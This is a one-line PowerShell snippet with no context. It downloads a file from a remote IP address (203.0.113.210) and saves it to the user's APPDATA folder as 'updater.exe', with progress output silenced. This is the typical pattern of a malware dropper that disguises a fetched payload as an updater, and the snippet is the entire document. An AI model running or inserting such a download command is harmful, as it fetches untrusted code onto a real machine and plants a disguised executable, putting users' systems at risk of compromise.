
$TargetUrl = "http://203.0.113.210/update.dat"; $DownloadPath = "$env:APPDATA\updater.exe"; (New-Object System.Net.WebClient).DownloadFile($TargetUrl, $DownloadPath); $ProgressPreference = "SilentlyContinue"
